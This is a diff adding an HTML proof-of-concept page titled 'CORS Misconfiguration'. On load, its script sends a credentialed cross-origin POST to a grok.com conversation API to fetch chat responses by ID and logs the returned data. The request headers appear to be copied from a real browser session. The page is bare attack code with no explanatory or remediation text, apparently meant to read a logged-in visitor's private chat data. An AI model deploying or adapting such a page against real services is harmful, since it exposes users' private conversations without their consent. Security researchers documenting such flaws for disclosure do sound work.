@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script type="text/javascript">
+fetch("https://grok.com/rest/app-chat/conversations/b9a6ab68-cb51-40a3-8aa6-49c27e6f452a/load-responses", {
+  "headers": {
+    "accept": "*/*",
+    "accept-language": "en-US,en;q=0.9",
+    "baggage": "sentry-environment=production,sentry-release=RJbr5milOY0Eb1yVvxBhT,sentry-public_key=b311e0f2690c81f25e2c4cf6d4f7ce1c,sentry-trace_id=d0784cc841e3acfabdb1b25868c5ad29,sentry-sampled=false",
+    "cache-control": "no-cache",
+    "content-type": "application/json",
+    "pragma": "no-cache",
+    "priority": "u=1, i",
+    "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
+    "sec-ch-ua-arch": "\"x86\"",
+    "sec-ch-ua-bitness": "\"64\"",
+    "sec-ch-ua-full-version": "\"131.0.6778.86\"",
+    "sec-ch-ua-full-version-list": "\"Google Chrome\";v=\"131.0.6778.86\", \"Chromium\";v=\"131.0.6778.86\", \"Not_A Brand\";v=\"24.0.0.0\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-model": "\"\"",
+    "sec-ch-ua-platform": "\"Windows\"",
+    "sec-ch-ua-platform-version": "\"10.0.0\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "sentry-trace": "d0784cc841e3acfabdb1b25868c5ad29-9726d04ef826c2d6-0",
+    "x-statsig-id": "ItPMbbhHonXQAi5EXxGtadduTFKX+irKFc+Sc00/dhO0IoTlyO8HGffq5mRrM2GXPBwCICa/8pS5alctVEM4JtMs8hAdIQ",
+    "x-xai-request-id": "f25d5f3d-57a9-49d0-a821-a4a87cfdc416"
+  },
+  "referrer": "https://grok.com/chat/b9a6ab68-cb51-40a3-8aa6-49c27e6f452a",
+  "referrerPolicy": "origin-when-cross-origin",
+  "body": "{\"responseIds\":[\"05a060b6-69c0-411d-ac68-25e1566cebf9\",\"3c73ecea-3456-4714-b98d-b380f86375d8\"]}",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+}).then(response => response.json())
+  .then(data => console.log(data))
+  .catch(error => console.error('Error:', error));
+</script>
+</head>
+<body>
+    <h1>CORS Misconfiguration</h1>
+</body>
